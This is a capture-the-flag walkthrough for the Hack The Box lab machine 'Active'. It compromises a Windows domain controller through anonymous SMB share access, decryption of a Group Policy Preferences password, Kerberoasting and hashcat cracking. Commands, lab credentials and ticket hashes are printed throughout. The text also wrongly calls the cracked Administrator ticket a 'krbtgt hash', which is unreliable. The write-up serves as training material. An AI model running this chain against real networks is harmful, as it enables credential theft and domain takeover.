---
URL: https://www.hackthebox.com/machines/active
Date: 2025-04-02
---
## Enumeration

### Nmap

The first thing we will do is a basic nmap scan of the machine using the most common ports.

```bash
$ sudo nmap -sC -sV -vv -oN nmap/inital nmap 10.129.236.220

Nmap scan report for 10.129.236.220
Host is up, received reset ttl 127 (0.035s latency).
Scanned at 2025-04-02 11:53:34 AEDT for 73s
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-02 00:53:43Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51605/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 47539/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 64288/udp): CLEAN (Timeout)
|   Check 4 (port 52471/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: 0s
| smb2-time: 
|   date: 2025-04-02T00:54:38
|_  start_date: 2025-04-01T01:56:02

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.50 seconds
           Raw packets sent: 1024 (45.032KB) | Rcvd: 1001 (40.108KB)
```

We see that there are multiple ports related to MS AD are opened, and the host name is *DC*, indicating that this is an Active Directory Domain Controller.

### SMB Shares

Since ports 139/445 are open, we can start with an SMB enumeration to see which shares are accessible for us. There are several tools that can be used for this, and we will pick `smbmap` and `smbclient` to enumerate and interact with the SMB server.

```bash
$ smbmap -H 10.129.236.220                                                   

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.236.220:445      Name: 10.129.236.220            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
[*] Closed 1 connections                                       
```

There is a share named `Replication` that can be accessed without any login info. Let's try interacting with this share and look whether there are any interesting files. 

Since we are connecting as an anonymous user we can use the `-N` flag, or we can use the `-U ""%""` flag to skip the password step.

```bash
$ smbclient //10.129.236.220/Replication -U ""%""
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  active.htb                          D        0  Sat Jul 21 20:37:44 2018

                10459647 blocks of size 4096. 5200893 blocks available
```

There seems to be multiple subdirectories inside `active.htb`, and manually going through them is going to take a while. Instead, we can use the `recurse` command to recursively list all available files inside the directory.

```bash
$ smbclient //10.129.236.220/Replication -N -c 'recurse; ls' 
Anonymous login successful
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  active.htb                          D        0  Sat Jul 21 20:37:44 2018

\active.htb
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 20:37:44 2018
  Policies                            D        0  Sat Jul 21 20:37:44 2018
  scripts                             D        0  Thu Jul 19 04:48:57 2018

\active.htb\DfsrPrivate
  .                                 DHS        0  Sat Jul 21 20:37:44 2018
  ..                                DHS        0  Sat Jul 21 20:37:44 2018
  ConflictAndDeleted                  D        0  Thu Jul 19 04:51:30 2018
  Deleted                             D        0  Thu Jul 19 04:51:30 2018
  Installing                          D        0  Thu Jul 19 04:51:30 2018

\active.htb\Policies
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 20:37:44 2018
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 20:37:44 2018

\active.htb\scripts
  .                                   D        0  Thu Jul 19 04:48:57 2018
  ..                                  D        0  Thu Jul 19 04:48:57 2018

\active.htb\DfsrPrivate\ConflictAndDeleted
  .                                   D        0  Thu Jul 19 04:51:30 2018
  ..                                  D        0  Thu Jul 19 04:51:30 2018

\active.htb\DfsrPrivate\Deleted
  .                                   D        0  Thu Jul 19 04:51:30 2018
  ..                                  D        0  Thu Jul 19 04:51:30 2018

\active.htb\DfsrPrivate\Installing
  .                                   D        0  Thu Jul 19 04:51:30 2018
  ..                                  D        0  Thu Jul 19 04:51:30 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  GPT.INI                             A       23  Thu Jul 19 06:46:06 2018
  Group Policy                        D        0  Sat Jul 21 20:37:44 2018
  MACHINE                             D        0  Sat Jul 21 20:37:44 2018
  USER                                D        0  Thu Jul 19 04:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  GPT.INI                             A       22  Thu Jul 19 04:49:12 2018
  MACHINE                             D        0  Sat Jul 21 20:37:44 2018
  USER                                D        0  Thu Jul 19 04:49:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  GPE.INI                             A      119  Thu Jul 19 06:46:06 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Microsoft                           D        0  Sat Jul 21 20:37:44 2018
  Preferences                         D        0  Sat Jul 21 20:37:44 2018
  Registry.pol                        A     2788  Thu Jul 19 04:53:45 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER
  .                                   D        0  Thu Jul 19 04:49:12 2018
  ..                                  D        0  Thu Jul 19 04:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Microsoft                           D        0  Sat Jul 21 20:37:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER
  .                                   D        0  Thu Jul 19 04:49:12 2018
  ..                                  D        0  Thu Jul 19 04:49:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Windows NT                          D        0  Sat Jul 21 20:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Groups                              D        0  Sat Jul 21 20:37:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Windows NT                          D        0  Sat Jul 21 20:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  SecEdit                             D        0  Sat Jul 21 20:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Groups.xml                          A      533  Thu Jul 19 06:46:06 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  SecEdit                             D        0  Sat Jul 21 20:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  GptTmpl.inf                         A     1098  Thu Jul 19 04:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  GptTmpl.inf                         A     3722  Thu Jul 19 04:49:12 2018

                10459647 blocks of size 4096. 5200893 blocks available
```

## GPP Attack

Even though this seems like a huge list, there is one file that immediately captures our attention, the `Groups.xml` file in the `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups` directory.

From the [[GPP Attack]], we know there can be files from older version of Windows, where the **cPassword** is still being used in the `Groups.xml` file. We can download this file and check whether this is the case here.

```bash
$ smbclient //10.129.236.220/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (2.9 KiloBytes/sec) (average 2.9 KiloBytes/sec)
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ^C

┌──(kali㉿kali)-[~/Documents/HTB/Active]
└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

As expected, we can see there is a *cPassword* attribute stored in the file. We can use `gpp-decrypt` to decrypt this value and get the original password.

```bash
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

We can do the same attack using `Metasplot` as well.

```bash
$ msfconsole
msf6 > use auxiliary/scanner/smb/smb_enum_gpp
msf6 auxiliary(scanner/smb/smb_enum_gpp) > set RHOST 10.129.236.220
RHOST => 10.129.236.220
msf6 auxiliary(scanner/smb/smb_enum_gpp) > set SMBSHARE Replication
SMBSHARE => Replication
msf6 auxiliary(scanner/smb/smb_enum_gpp) > run
[*] 10.129.236.220:445 - Connecting to the server...
[*] 10.129.236.220:445 - Mounting the remote share \\10.129.236.220\Replication'...
[+] 10.129.236.220:445 - Found Policy Share on 10.129.236.220
[*] 10.129.236.220:445 - Parsing file: \\10.129.236.220\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
[+] 10.129.236.220:445 - Group Policy Credential Info
============================

 Name               Value
 ----               -----
 TYPE               Groups.xml
 USERNAME           active.htb\SVC_TGS
 PASSWORD           GPPstillStandingStrong2k18
 DOMAIN CONTROLLER  10.129.236.220
 DOMAIN             active.htb
 CHANGED            2018-07-18 20:46:06
 NEVER_EXPIRES?     1
 DISABLED           0

[+] 10.129.236.220:445 - XML file saved to: /home/kali/.msf4/loot/20250402124654_default_10.129.236.220_microsoft.window_110741.txt
[+] 10.129.236.220:445 - Groups.xml saved as: /home/kali/.msf4/loot/20250402124654_default_10.129.236.220_smb.shares.file_782385.xml
[*] 10.129.236.220:445 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

From the *name* attribute, we can assume this the password for the `SVC_TGS` account in the `active.htb` domain. From the name of the account, it suggests that this has to do something with the **Ticket Granting Service** of Kerberos.

Since we have a username and a password now, we can check whether there are any new shares that we can access.

```bash
$ smbmap -H 10.129.236.220 -u SVC_TGS -p GPPstillStandingStrong2k18                                 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.236.220:445      Name: 10.129.236.220            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
[*] Closed 1 connections 
```

Now we have access to the `NETLOGON`, `SYSVOL`, and `Users` shares as well. Since we are after the user flag, it might probably be in the `Users` share. 

```bash
$ smbclient //10.129.236.220/Users -U SVC_TGS%GPPstillStandingStrong2k18
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Jul 22 00:39:20 2018
  ..                                 DR        0  Sun Jul 22 00:39:20 2018
  Administrator                       D        0  Mon Jul 16 20:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 15:06:44 2009
  Default                           DHR        0  Tue Jul 14 16:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 15:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 14:57:55 2009
  Public                             DR        0  Tue Jul 14 14:57:55 2009
  SVC_TGS                             D        0  Sun Jul 22 01:16:32 2018

                10459647 blocks of size 4096. 5200893 blocks available
smb: \> cd SVC_TGS\
smb: \SVC_TGS\> ls
  .                                   D        0  Sun Jul 22 01:16:32 2018
  ..                                  D        0  Sun Jul 22 01:16:32 2018
  Contacts                            D        0  Sun Jul 22 01:14:11 2018
  Desktop                             D        0  Sun Jul 22 01:14:42 2018
  Downloads                           D        0  Sun Jul 22 01:14:23 2018
  Favorites                           D        0  Sun Jul 22 01:14:44 2018
  Links                               D        0  Sun Jul 22 01:14:57 2018
  My Documents                        D        0  Sun Jul 22 01:15:03 2018
  My Music                            D        0  Sun Jul 22 01:15:32 2018
  My Pictures                         D        0  Sun Jul 22 01:15:43 2018
  My Videos                           D        0  Sun Jul 22 01:15:53 2018
  Saved Games                         D        0  Sun Jul 22 01:16:12 2018
  Searches                            D        0  Sun Jul 22 01:16:24 2018

                10459647 blocks of size 4096. 5200893 blocks available
smb: \SVC_TGS\> cd Desktop\
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sun Jul 22 01:14:42 2018
  ..                                  D        0  Sun Jul 22 01:14:42 2018
  user.txt                           AR       34  Tue Apr  1 12:57:12 2025

                10459647 blocks of size 4096. 5200893 blocks available
smb: \SVC_TGS\Desktop\> get user.txt 
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

$ cat user.txt  
8d*************************
```

We find the flag in the Desktop of the `SVC_TGS` user.

## Kerberoasting

Next, we need to escalate privileges to admin access to get the root flag. Since we have already compromised a domain account, we can use a [[Kerberoasting]] attack to get the `krbtgt` hash and try to crack it.

```bash
$ GetUserSPNs.py -request -dc-ip 10.129.236.220 active.htb/SVC_TGS:GPPstillStandingStrong2k18 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 05:06:40  2025-04-01 12:57:18 



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$a6447103b922943d647c34044deb3101$46c5ccf0d1c985d6c9c09aec34446711e8cfce003d4ade614320001dff06a6456b67a15fc05ed7cfb07e6cec43cc9bc32ef785c389625db615eb7c06e1d46d428bddf5ba8e702d161b91cf0ca2f8ca2479e1493912a9438e473a7d7e56ca458a64f9dd8c9512ac35c15b9de7a66338375cf826cc842db426b36d4b0e387bf9b37209404c967c561e472ebc5214de729754ca361a7db8c13aeaa1cc670b39646e2d98da10bdc589846a19a8a0b79e6b1b37110f35bf609f65eade77defb9ad3ae82942bda0d8adc35e394d6ce62b8af977457021c05ccd12257332ef6ec196a92611d91f736bdc5cb71794a9e3acb2fa8c9db6c4a3f9589315c684a8fdeb2e74406f18fb383e0d7511cbf6e4f9d7fad62b6910392cd23828b665601fa26dd845dc93aa3c300c767443c98b04838eb1ac10f625e1faa584ef0a282ca9bf9a540abd862b9d1712f0d65b0a2258bce228b591493022581e0adb4d2321a1292dc2099bc5b98381b0871b542447783a9fc9d88a14800871c7941f8f4ef2a1bdc0ae6cda9acd985084d49c3838b86cfcb4b80867c2369673cee5f4b635eb351d97253349f00b25e2ea7f6614975294bb43d6c0399099e0aa096c2b29813eb6cc1ea687b4c1713fa4ad60a42ffbee0e6d9f17bcd7d6202164986dc42b8ba06fc9e0c4c3a759113a9a44c11b3cc045ace894143b02f2c42387366640d0fcadc4a9c7615f6ac705e2d347d9774f480fa12ee6af7d23bf948c6cc8c9befdfb8cbff6443d3d24bc50a6e4226fc6406a80cc8a34e3a586157d8d0263fcbc584eed7456c152e693d1f3192bfac3e0ca65ccc6e38c1dd8582a1b534e8ecea26b32c26acf2219e0d479d7c25237306f872858b91ce27d28abd3be78b5924590f601dd62905cb63c111d5da1b8c44736110bf8e371bd976db218917444399555b681eb417001b8ca1ed35f72f5d62108247a9ab6697685e4ffca10bdd4988f73d3925870f78fc37f88db35b555d520e0f57edce0d0ab016f59fed88852a11f8917cb5a2371cdeaac49a40c0623131bda6cef9bae95e4f734f2eb63a5e5bd6468a1c6d67f608d06c1f5b4c8b5a83208eede46b1962a9a6b7c58d69920d4f01f5b938ecbec7d6746a6d6a2844e6dc1307a3baa148d2172055bed92043f5a3e3780fb6c4ed60a5ec511c2dd484e9fb4b2927a49fe2b22ab4fc2861023fce4f24ce459ab6db124c5addd6fefe594761e5c8416c0ac06ac3065156388f9d569e4ae376f5c9
```

We can save this hash to a file and pass it to `hashcat` to crack the hash for us.

```bash
$ hashcat -m 13100 krbtgt.txt /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$05c68d9e01bbeeb61dfe60f62438a1af$4cc3c1c347652015aba1a40afbe1802b3e035141fddbd4c593b41cff569496e171d27622e8263423ef15925181399623764cd4760605c688692344c4d64a93012e24ed290256f17a795976d02319faa2656fb8b4e705d07bb1e3543471386e32864b4d39a2bf7ef5e7025dd4c1e44903c20bc973c20f16048756f57514b3105436515a3a70d9af99aa43222f2adf1830f17e75507349da0fb337539d14da8ad4d82f02094ebc6ecd8148e562ab18aa2cfb786490f48e23eed8699c7dc8321510e7b575d2ce85f08c2668df330333e38f8eaaebcc69322ed360a77d936c6ceb818f6954135dfc4d97898b417612f6171965b909162205823b6d7cee6163a6d792877c117610b1d34adf27144674357fb291f5b393cde15609400ed35fe1f2bf6b856d3ea769280e618d6e3809940dc2e4179318f9f461f420fcddaf2354bcbe211a81f663fd1c6b080cb92551a419ccb48d0ce2050fd1d85104a5778dffbf805a7b4ae77940b3b0a061fbb8163b0246d35dd292c69d23c666cbb1e456ca861bd342c693d0200b57f47916bf644f58a64107d1d37c876dceee75fbd6acad4a5a0f4f163ac4139c263ffc7a7214b44c667905ad0a786aeda8e9a12fe351b06a88eec68c5c72950af3c921ffe59acddc7ad058136e4a6f396f83d029cf6ebfc333ae9f12421939eea16267f79a82e0848a22033328787ae6ced0a7db14945596256204b218b97508c9ad0942e890a0fb40b6730555398cae99bf5ec7542636151815472d2197e4e49da3617369e844dcb03642521c77724809342b67085df864255ed73067669952c2aea4511d51ad3dd6694fe6441113a437d1bf8c308222350cc86a87ccbadec298faca63b9b28cfe459053a56477a3b560e545630c03d48314d93a3806447c77e2dbbf97127588fd563e3efc51f98cb23951921c6d2845b7e695f4399c4885bfcd15bc6698e4cb4175b857cc08f1cca4f0f364809c2e0fa27b4267656a3f513bd6df390d73a14c4e1d0bc3bfab274a4f2418ba6ba9429a0164db369673e07fa4cd5c5dc0f85205584a0e20d44f5a201716f5c7709d642d70468820e24a60911b6ae5962dd7fad9c3d1efe6a258a69015c9636cf526f45ec94ed1991966e47e4988025df3034aa6e55742d91f8300044f7c75999062f4dd70a6930c69be15357df7531bf4a11e809e9121f31c22207ca7d0a4db2a6d139f265c46b729f933af328b7a6e036ad94a573ef575d47de4095b3fb1e4ed:Ticketmaster1968
```

Since I had already crack the hash before it is stored in my potfile. Hence I need to add the `--show` flag to display the cracked hash. The password of the `Administrator` account is `Ticketmaster1968`.

Since this probably domain admin account we might have access to all the shares in the server. We can check it with `smbmap` same as before.

```bash
$ smbmap -H 10.129.236.220 -u administrator -p Ticketmaster1968         

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[!] Unable to remove test file at \\10.129.236.220\SYSVOL\MIWFGZYLHS.txt, please remove manually                             
                                                                                                                             
[+] IP: 10.129.236.220:445      Name: 10.129.236.220            Status: ADMIN!!!   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ, WRITE     Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ, WRITE     Logon server share 
        Users                                                   READ ONLY
[*] Closed 1 connections
```

As expected, we can read all shares except `IPC$`. We can connect to the `C$` share to get the flag from the admin desktop.

```bash
$ smbclient //10.129.236.220/C$ -U administrator%Ticketmaster1968
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Tue Jul 14 12:34:39 2009
  Config.Msi                        DHS        0  Tue Jul 31 00:10:06 2018
  Documents and Settings          DHSrn        0  Tue Jul 14 15:06:44 2009
  pagefile.sys                      AHS 6441918464  Tue Apr  1 12:55:50 2025
  PerfLogs                            D        0  Tue Jul 14 13:20:08 2009
  Program Files                      DR        0  Thu Jul 19 04:44:51 2018
  Program Files (x86)                DR        0  Fri Jan 22 03:49:16 2021
  ProgramData                       DHn        0  Mon Jul 30 23:49:31 2018
  Recovery                         DHSn        0  Mon Jul 16 20:13:22 2018
  System Volume Information         DHS        0  Thu Jul 19 04:45:01 2018
  Users                              DR        0  Sun Jul 22 00:39:20 2018
  Windows                             D        0  Wed Apr  2 12:39:16 2025

                10459647 blocks of size 4096. 5200877 blocks available
smb: \> cd Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Fri Jan 22 03:49:47 2021
  ..                                 DR        0  Fri Jan 22 03:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 23:50:10 2018
  root.txt                           AR       34  Tue Apr  1 12:57:12 2025

                10459647 blocks of size 4096. 5200877 blocks available
smb: \Users\Administrator\Desktop\> get root.txt 
getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

$ cat root.txt 
3a********************
```

